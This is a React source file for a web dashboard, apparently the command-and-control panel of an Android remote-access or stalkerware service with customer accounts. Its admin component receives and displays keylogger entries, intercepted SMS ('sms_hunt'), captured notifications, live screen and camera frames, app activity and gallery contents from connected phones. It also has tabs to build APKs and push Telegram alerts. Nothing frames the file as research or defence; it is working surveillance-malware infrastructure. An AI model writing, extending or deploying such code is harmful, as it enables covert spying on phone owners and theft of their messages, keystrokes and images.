import React, { useState, useCallback, useRef, useEffect } from 'react';
import { useTcpStream } from './hooks/useTcpStream.js';
import Sidebar from './components/Sidebar.jsx';
import DeviceControl from './components/DeviceControl.jsx';
import Overview from './components/Overview.jsx';
import StatusBar from './components/StatusBar.jsx';
import Login from './components/Login.jsx';
import ServerLogsTab from './components/ServerLogsTab.jsx';
import SettingsTab from './components/SettingsTab.jsx';
import PortViewTab from './components/PortViewTab.jsx';
import BuildApkTab from './components/BuildApkTab.jsx';
import AdminUsersTab from './components/AdminUsersTab.jsx';
import TelegramTab from './components/TelegramTab.jsx';
import UserLogin from './components/UserLogin.jsx';
import UserRegister from './components/UserRegister.jsx';
import TermsAndConditions from './components/TermsAndConditions.jsx';
import UserDashboard from './components/UserDashboard.jsx';
import { decodeScreenFrame } from './utils/screenFrame.js';
import './App.css';

// ─── Determine initial mode from localStorage ───────────────────────────────
function getInitialMode() {
  if (localStorage.getItem('user_token')) return 'user';
  return 'user-login'; // always show login page; admin access is via button
}

// ─── Admin auth hook (unchanged) ────────────────────────────────────────────
function useAdminAuth() {
  const [authed, setAuthed] = useState(null);

  useEffect(() => {
    const token = localStorage.getItem('admin_token');
    if (!token) { setAuthed(false); return; }
    fetch('/api/admin/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token }),
    })
      .then(r => r.json())
      .then(d => setAuthed(!!d.success))
      .catch(() => setAuthed(false));
  }, []);

  const logout = () => {
    localStorage.removeItem('admin_token');
    setAuthed(false);
  };

  return { authed, setAuthed, logout };
}

// ─── User auth hook ──────────────────────────────────────────────────────────
function useUserAuth() {
  const [userAuthed, setUserAuthed] = useState(null);
  const [userInfo, setUserInfo]     = useState(null);

  useEffect(() => {
    const token = localStorage.getItem('user_token');
    if (!token) { setUserAuthed(false); return; }
    fetch('/api/user-auth/me', {
      headers: { Authorization: `Bearer ${token}` },
    })
      .then(r => r.json())
      .then(d => {
        if (d.success) {
          setUserAuthed(true);
          setUserInfo(d.user);
          localStorage.setItem('user_info', JSON.stringify(d.user));
        } else {
          localStorage.removeItem('user_token');
          localStorage.removeItem('user_info');
          setUserAuthed(false);
        }
      })
      .catch(() => {
        // If server unreachable, try to use cached info
        const cached = localStorage.getItem('user_info');
        if (cached) {
          try {
            setUserInfo(JSON.parse(cached));
            setUserAuthed(true);
          } catch {
            setUserAuthed(false);
          }
        } else {
          setUserAuthed(false);
        }
      });
  }, []);

  const logout = () => {
    localStorage.removeItem('user_token');
    localStorage.removeItem('user_info');
    setUserAuthed(false);
    setUserInfo(null);
  };

  return { userAuthed, setUserAuthed, userInfo, setUserInfo, logout };
}

// ─── Root component ──────────────────────────────────────────────────────────
export default function App() {
  const [mode, setMode]                 = useState(getInitialMode);
  const [showTerms, setShowTerms]       = useState(false);

  const { authed, setAuthed, logout: adminLogout }             = useAdminAuth();
  const { userAuthed, setUserAuthed, userInfo, setUserInfo, logout: userLogout } = useUserAuth();

  // ── Admin flow ──────────────────────────────────────────────────────────
  if (mode === 'admin') {
    if (authed === null) {
      return <Splash text="Verifying admin session…" />;
    }
    if (!authed) {
      return (
        <Login
          onLogin={() => setAuthed(true)}
          onSwitchToUser={() => setMode('user-login')}
        />
      );
    }
    return <AdminDashboard logout={() => { adminLogout(); setMode('user-login'); }} />;
  }

  // ── User flow ───────────────────────────────────────────────────────────
  if (mode === 'user') {
    if (userAuthed === null) {
      return <Splash text="Verifying session…" />;
    }
    if (!userAuthed) {
      setMode('user-login');
      return <Splash text="Redirecting…" />;
    }
    return <UserDashboard user={userInfo} onLogout={() => { userLogout(); setMode('user-login'); }} />;
  }

  if (mode === 'user-register') {
    return (
      <>
        <UserRegister
          onRegistered={(userOrEmail) => {
            if (userOrEmail && typeof userOrEmail === 'object') {
              setUserInfo(userOrEmail);
              setUserAuthed(true);
              setMode('user');
            } else {
              setMode('user-login');
            }
          }}
          onSwitchToLogin={() => setMode('user-login')}
          onShowTerms={() => setShowTerms(true)}
        />
        {showTerms && <TermsAndConditions onClose={() => setShowTerms(false)} />}
      </>
    );
  }

  // default: user-login
  return (
    <UserLogin
      onLogin={(user) => {
        setUserInfo(user);
        setUserAuthed(true);
        setMode('user');
      }}
      onSwitchToAdmin={() => setMode('admin')}
    />
  );
}

// ─── Splash screen ───────────────────────────────────────────────────────────
function Splash({ text }) {
  return (
    <div className="app-splash" role="status" aria-live="polite">
      <span className="loading-spinner" aria-hidden="true" />
      <span>{text}</span>
    </div>
  );
}

// ─── Admin dashboard (unchanged logic) ───────────────────────────────────────
function AdminDashboard({ logout }) {
  const [devices, setDevices]                         = useState([]);
  const [selectedDevice, setSelectedDevice]           = useState(null);
  const [globalView, setGlobalView]                   = useState('overview');
  const [commandResults, setCommandResults]           = useState([]);
  const [pendingCommands, setPendingCommands]         = useState({});
  const [activityLog, setActivityLog]                 = useState([]);
  const [streamFrames, setStreamFrames]               = useState({});
  const [cameraFrames, setCameraFrames]               = useState({});
  const [keylogPushEntries, setKeylogPushEntries]     = useState([]);
  const [notifPushEntries, setNotifPushEntries]       = useState([]);
  const [activityAppEntries, setActivityAppEntries]   = useState([]);
  const [smsHuntEntries, setSmsHuntEntries]           = useState([]);
  const [screenReaderPushData, setScreenReaderPushData] = useState({});
  const [offlineRecordingVersion, setOfflineRecordingVersion] = useState({});
  const [serverLatency, setServerLatency]             = useState(null);
  const [deviceLatencies, setDeviceLatencies]         = useState({});
  const [gcodeVersion, setGcodeVersion]               = useState({});
  const [galleryStreams, setGalleryStreams] = useState({});
  const [deviceActionBusy, setDeviceActionBusy] = useState(null);
  const [deviceActionNotice, setDeviceActionNotice] = useState(null);
  const pingPendingRef  = useRef({});
  const chunkStreamsRef = useRef({});

  const handleDeviceAction = useCallback(async (device, action) => {
    const isDelete = action === 'delete';
    const isBlock = action === 'block';
    const isCurrentlyBlocked = !!device.blocked;
    const nextBlocked = isBlock ? !isCurrentlyBlocked : null;
    const deviceLabel = device.deviceName || device.deviceId;

    if (isDelete && !window.confirm(
      `Delete ${deviceLabel}? This removes the device from the dashboard and disconnects it if online.`
    )) return;
    if (isBlock && nextBlocked && !window.confirm(
      `Block ${deviceLabel}? It will be disconnected and future connections will be rejected.`
    )) return;

    setDeviceActionBusy(device.deviceId);
    setDeviceActionNotice(null);
    try {
      const token = localStorage.getItem('admin_token');
      const response = await fetch(
        isDelete
          ? `/api/admin/devices/${encodeURIComponent(device.deviceId)}`
          : `/api/admin/devices/${encodeURIComponent(device.deviceId)}/block`,
        {
          method: isDelete ? 'DELETE' : 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${token}`,
          },
          ...(isDelete ? {} : { body: JSON.stringify({ blocked: nextBlocked }) }),
        }
      );
      const result = await response.json().catch(() => ({}));
      if (!response.ok || !result.success) {
        throw new Error(result.error || `Could not ${isDelete ? 'delete' : nextBlocked ? 'block' : 'allow'} the device`);
      }

      if (isDelete) {
        setDevices(prev => prev.filter(item => item.deviceId !== device.deviceId));
        setSelectedDevice(prev => prev === device.deviceId ? null : prev);
        setActivityLog(prev => [{
          id: Date.now(),
          type: 'info',
          text: `Device deleted: ${deviceLabel}`,
          time: new Date(),
        }, ...prev].slice(0, 100));
        setDeviceActionNotice({ type: 'success', text: `${deviceLabel} deleted.` });
      } else {
        setDevices(prev => prev.map(item => item.deviceId === device.deviceId
          ? { ...item, blocked: nextBlocked, isOnline: nextBlocked ? false : item.isOnline }
          : item
        ));
        setActivityLog(prev => [{
          id: Date.now(),
          type: nextBlocked ? 'error' : 'success',
          text: `Device ${nextBlocked ? 'blocked' : 'allowed'}: ${deviceLabel}`,
          time: new Date(),
        }, ...prev].slice(0, 100));
        setDeviceActionNotice({
          type: 'success',
          text: `${deviceLabel} ${nextBlocked ? 'blocked.' : 'allowed to reconnect.'}`,
        });
      }
    } catch (error) {
      setDeviceActionNotice({ type: 'error', text: error.message || 'Device action failed.' });
    } finally {
      setDeviceActionBusy(null);
    }
  }, []);

  const handleMessage = useCallback((event, data) => {
    switch (event) {
      case 'device:list':
        setDevices(Array.isArray(data) ? data : []);
        break;
      case 'device:connected':
        setActivityLog(prev => [{ id: Date.now(), type: 'connect', text: `Device connected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
        if (data.deviceId && data.deviceInfo) {
          setDevices(prev => {
            const exists = prev.find(d => d.deviceId === data.deviceId);
            if (exists) return prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, deviceInfo: { ...(d.deviceInfo || {}), ...data.deviceInfo } } : d);
            return [...prev, {
              deviceId: data.deviceId,
              deviceName: data.deviceInfo.name || data.deviceId,
              deviceInfo: data.deviceInfo,
              registeredAt: data.timestamp || new Date().toISOString(),
              lastSeen: data.timestamp || new Date().toISOString(),
              isOnline: true,
            }];
          });
        }
        break;
      case 'device:disconnected':
        setActivityLog(prev => [{ id: Date.now(), type: 'disconnect', text: `Device disconnected: ${data.deviceId}`, time: new Date() }, ...prev].slice(0, 100));
        setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: false } : d));
        break;
      case 'device:heartbeat':
        setDevices(prev => prev.map(d => d.deviceId === data.deviceId ? { ...d, isOnline: true, lastSeen: data.timestamp } : d));
        break;
      case 'command:sent':
        setPendingCommands(prev => ({ ...prev, [data.commandId]: data }));
        if (data.command === 'ping' && data.deviceId) {
          const pendingKey = `__pending_${data.deviceId}`;
          if (pingPendingRef.current[pendingKey] !== undefined) {
            pingPendingRef.current[data.commandId] = { deviceId: data.deviceId, sentAt: pingPendingRef.current[pendingKey] };
            delete pingPendingRef.current[pendingKey];
          }
        }
        break;
      case 'dashboard:pong':
        if (data?.sentAt) setServerLatency(Date.now() - data.sentAt);
        break;
      case 'device:latency':
        if (data?.deviceId && data.rtt != null) setDeviceLatencies(prev => ({ ...prev, [data.deviceId]: data.rtt }));
        break;
      case 'command:result': {
        setPendingCommands(prev => { const next = { ...prev }; delete next[data.commandId]; return next; });
        if (data.commandId && pingPendingRef.current[data.commandId]) {
          const { deviceId, sentAt } = pingPendingRef.current[data.commandId];
          delete pingPendingRef.current[data.commandId];
          setDeviceLatencies(prev => prev[deviceId] != null ? prev : { ...prev, [deviceId]: Date.now() - sentAt });
        }
        // The server emits a result for discarded duplicate commands so the
        // UI can remove their waiters.  Do not show those internal coalescing
        // acknowledgements as command failures.
        if (data.superseded) break;
        const result = { id: data.commandId || Date.now(), command: data.command, deviceId: data.deviceId, success: data.success, response: data.response, error: data.error, time: new Date() };
        setCommandResults(prev => [result, ...prev].slice(0, 200));
        setActivityLog(prev => [{ id: Date.now(), type: data.success ? 'success' : 'error', text: `${data.command} → ${data.success ? 'OK' : data.error}`, time: new Date() }, ...prev].slice(0, 100));
        break;
      }
      case 'queue:reset':
        setPendingCommands(prev => {
          const next = { ...prev };
          for (const [commandId, pending] of Object.entries(next)) {
            if (!data?.deviceId || pending.deviceId === data.deviceId) delete next[commandId];
          }
          return next;
        });
        break;
      case 'data:chunk': {
        const { commandId, command, fieldName, chunk, done, error, deviceId } = data;
        if (!commandId) break;
        if (!chunkStreamsRef.current[commandId]) chunkStreamsRef.current[commandId] = { command, fieldName, deviceId, items: [] };
        const stream = chunkStreamsRef.current[commandId];
        if (fieldName && !stream.fieldName) stream.fieldName = fieldName;
        if (chunk && Array.isArray(chunk)) for (const item of chunk) stream.items.push(item);

        // ── Progressive gallery streaming ──────────────────────────────────
        if (stream.command === 'get_gallery' && stream.deviceId) {
          const snapItems = [...stream.items];
          setGalleryStreams(prev => ({
            ...prev,
            [stream.deviceId]: { items: snapItems, loading: !done, done: !!done, error: done ? (error || null) : null },
          }));
        }

        if (done) {
          delete chunkStreamsRef.current[commandId];
          if (error) {
            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: false, error, response: null, time: new Date() }, ...prev].slice(0, 200));
          } else {
            const field = stream.fieldName || 'items';
            setCommandResults(prev => [{ id: commandId, command: stream.command, deviceId: stream.deviceId, success: true, response: { success: true, [field]: stream.items, count: stream.items.length }, error: null, time: new Date() }, ...prev].slice(0, 200));
            setActivityLog(prev => [{ id: Date.now(), type: 'success', text: `${stream.command} → OK (${stream.items.length} items)`, time: new Date() }, ...prev].slice(0, 100));
          }
          setPendingCommands(prev => { const n = { ...prev }; delete n[commandId]; return n; });
        }
        break;
      }
      case 'command:error':
        setCommandResults(prev => [{ id: Date.now(), command: data.command || 'unknown', deviceId: data.deviceId, success: false, error: data.message, time: new Date() }, ...prev].slice(0, 200));
        break;
      case 'task:progress':
        setCommandResults(prev => [{ id: `tp_${Date.now()}_${Math.random()}`, command: 'task_progress', deviceId: data.deviceId, success: !data.error, response: data, error: data.error || null, time: new Date() }, ...prev].slice(0, 200));
        break;
      case 'stream:frame':
        if (data.deviceId && data.frameData) {
          if (data.timestamp && Date.now() - data.timestamp > 2000) break;
          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
          if (data.screenWidth && data.screenHeight) {
            setDevices(prev => prev.map(d => {
              if (d.deviceId !== data.deviceId) return d;
              const existing = d.deviceInfo || {};
              if (existing.screenWidth === data.screenWidth && existing.screenHeight === data.screenHeight) return d;
              return { ...d, deviceInfo: { ...existing, screenWidth: data.screenWidth, screenHeight: data.screenHeight } };
            }));
          }
        }
        break;
      case 'camera:frame':
        if (data.deviceId && data.frameData) {
          if (data.timestamp && Date.now() - data.timestamp > 5000) break;
          setCameraFrames(prev => ({ ...prev, [data.deviceId]: { frameData: data.frameData, cameraId: data.cameraId, _ts: data._ts || Date.now() } }));
        }
        break;
      case 'keylog:push':
        if (data?.deviceId) setKeylogPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        break;
      case 'keylog:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setKeylogPushEntries(prev => {
            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
            const fresh = data.entries.filter(e => !existingIds.has(e.id || e.timestamp)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 500);
          });
        }
        break;
      case 'notification:push':
        if (data?.deviceId) setNotifPushEntries(prev => [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 500));
        break;
      case 'notification:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setNotifPushEntries(prev => {
            const existingIds = new Set(prev.map(e => e.id || e.timestamp));
            const fresh = data.entries.filter(e => !existingIds.has(e.id || e.timestamp)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 500);
          });
        }
        break;
      case 'activity:app_open':
        if (data?.deviceId) {
          setActivityAppEntries(prev => {
            if (prev.length && prev[0].packageName === data.packageName && prev[0].deviceId === data.deviceId) return prev;
            return [{ ...data, _pushId: Date.now() + Math.random() }, ...prev].slice(0, 200);
          });
        }
        break;
      case 'activity:history':
        if (data?.deviceId && Array.isArray(data.entries) && data.entries.length > 0) {
          setActivityAppEntries(prev => {
            const existingKeys = new Set(prev.map(e => `${e.deviceId}:${e.packageName}:${e.timestamp}`));
            const fresh = data.entries.filter(e => !existingKeys.has(`${data.deviceId}:${e.packageName}:${e.timestamp}`)).map(e => ({ ...e, deviceId: data.deviceId, _pushId: Date.now() + Math.random() }));
            return [...prev, ...fresh].slice(0, 200);
          });
        }
        break;
      case 'sms_hunt:message':
        if (data?.deviceId && data.message) {
          setSmsHuntEntries(prev => [{ ...data.message, deviceId: data.deviceId }, ...prev].slice(0, 1000));
        }
        break;
      case 'sms_hunt:history':
        if (data?.deviceId && Array.isArray(data.messages)) {
          setSmsHuntEntries(prev => {
            const existing = new Set(prev.map(message => message._id || message.messageKey));
            const fresh = data.messages
              .filter(message => !existing.has(message._id || message.messageKey))
              .map(message => ({ ...message, deviceId: data.deviceId }));
            return [...prev, ...fresh].slice(0, 1000);
          });
        }
        break;
      case 'screen:update':
        if (data?.deviceId) {
          // Compressed frames stay compressed through the backend's realtime
          // relay. Decode off the event handler so a large tree never blocks
          // processing of later SSE messages.
          decodeScreenFrame(data).then(frame => {
            if (!frame?.deviceId) return;
            setScreenReaderPushData(prev => {
              const current = prev[frame.deviceId];
              if (frame.sequence && current?.sequence >= frame.sequence) return prev;
              return { ...prev, [frame.deviceId]: frame };
            });
          }).catch(() => {});
        }
        break;
      case 'offline_recording:saved':
        if (data?.deviceId) setOfflineRecordingVersion(prev => ({ ...prev, [data.deviceId]: (prev[data.deviceId] || 0) + 1 }));
        break;
      case 'gcode_screenshot:save':
        if (data?.deviceId) setGcodeVersion(prev => ({ ...prev, [data.deviceId]: (prev[data.deviceId] || 0) + 1 }));
        break;
      default:
        break;
    }
  }, []);

  const { connected, reconnecting, send } = useTcpStream(handleMessage);
  const sendCommand = useCallback((deviceId, command, params = null) => send('command:send', { deviceId, command, params }), [send]);

  useEffect(() => {
    if (!connected) return;
    const tick = () => send('dashboard:ping', { sentAt: Date.now() });
    tick();
    const id = setInterval(tick, 15000);
    return () => clearInterval(id);
  }, [connected, send]);

  return (
    <div className="app">
      <StatusBar connected={connected} reconnecting={reconnecting} deviceCount={devices.filter(d => d.isOnline).length} onLogout={logout} />
      {deviceActionNotice && (
        <div
          role="status"
          onClick={() => setDeviceActionNotice(null)}
          style={{
            position: 'fixed',
            top: 48,
            right: 18,
            zIndex: 1000,
            maxWidth: 360,
            padding: '10px 14px',
            borderRadius: 8,
            border: `1px solid ${deviceActionNotice.type === 'error' ? 'rgba(239,68,68,0.45)' : 'rgba(34,197,94,0.4)'}`,
            background: deviceActionNotice.type === 'error' ? '#451a1a' : '#123524',
            color: deviceActionNotice.type === 'error' ? '#fca5a5' : '#86efac',
            boxShadow: '0 8px 24px rgba(0,0,0,0.35)',
            fontSize: 12,
            cursor: 'pointer',
          }}
        >
          {deviceActionNotice.type === 'error' ? '❌' : '✅'} {deviceActionNotice.text}
        </div>
      )}
      <div className="app-body">
        <Sidebar
          devices={devices}
          selectedDevice={selectedDevice}
          onSelectDevice={setSelectedDevice}
          onBlockDevice={device => handleDeviceAction(device, 'block')}
          onDeleteDevice={device => handleDeviceAction(device, 'delete')}
          deviceActionBusy={deviceActionBusy}
        />
        <main className="main-content">
          {selectedDevice ? (
            <DeviceControl
              key={selectedDevice}
              device={devices.find(d => d.deviceId === selectedDevice) || { deviceId: selectedDevice }}
              sendCommand={sendCommand}
              results={commandResults.filter(r => r.deviceId === selectedDevice)}
              pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
              onBack={() => setSelectedDevice(null)}
              streamFrame={streamFrames[selectedDevice] || null}
              cameraFrame={cameraFrames[selectedDevice] || null}
              send={send}
              keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
              notifPushEntries={notifPushEntries.filter(e => e.deviceId === selectedDevice)}
              activityAppEntries={activityAppEntries.filter(e => e.deviceId === selectedDevice)}
               smsHuntEntries={smsHuntEntries.filter(e => e.deviceId === selectedDevice)}
              screenReaderPushData={screenReaderPushData[selectedDevice] || null}
              offlineRecordingVersion={offlineRecordingVersion[selectedDevice] || 0}
              serverLatency={serverLatency}
              deviceLatency={deviceLatencies[selectedDevice] ?? null}
              gcodeVersion={gcodeVersion[selectedDevice] || 0}
              galleryStream={galleryStreams[selectedDevice] || null}
               connected={connected}
            />
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
              <div style={{ display: 'flex', gap: 4, padding: '0 0 14px 0', borderBottom: '1px solid #1e1b4b', marginBottom: 16 }}>
                {[
                  { id: 'overview',       label: '📊 Overview' },
                  { id: 'users',         label: '👥 Users' },
                  { id: 'build',         label: '📦 Build APK' },
                  { id: 'notifications', label: '📢 Notifications' },
                  { id: 'logs',          label: '🖥️ Server Logs' },
                  { id: 'settings',      label: '⚙️ Settings' },
                  { id: 'ports',         label: '🔌 Ports' },
                ].map(tab => (
                  <button
                    key={tab.id}
                    onClick={() => setGlobalView(tab.id)}
                    style={{
                      background: globalView === tab.id ? 'rgba(99,102,241,0.2)' : 'transparent',
                      border: globalView === tab.id ? '1px solid #6366f1' : '1px solid transparent',
                      color: globalView === tab.id ? '#a5b4fc' : '#64748b',
                      borderRadius: 8, padding: '6px 16px', fontSize: 13,
                      cursor: 'pointer', fontWeight: globalView === tab.id ? 600 : 400,
                      transition: 'all 0.15s',
                    }}
                  >
                    {tab.label}
                  </button>
                ))}
              </div>
              <div style={{ flex: 1, minHeight: 0 }}>
                {globalView === 'overview' ? (
                  <Overview
                    devices={devices}
                    activityLog={activityLog}
                    onSelectDevice={setSelectedDevice}
                    onBlockDevice={device => handleDeviceAction(device, 'block')}
                    onDeleteDevice={device => handleDeviceAction(device, 'delete')}
                    deviceActionBusy={deviceActionBusy}
                    connected={connected}
                  />
                ) : globalView === 'users' ? (
                  <AdminUsersTab />
                ) : globalView === 'build' ? (
                  <BuildApkTab user={null} />
                ) : globalView === 'notifications' ? (
                  <TelegramTab />
                ) : globalView === 'settings' ? (
                  <SettingsTab />
                ) : globalView === 'ports' ? (
                  <PortViewTab />
                ) : (
                  <ServerLogsTab />
                )}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
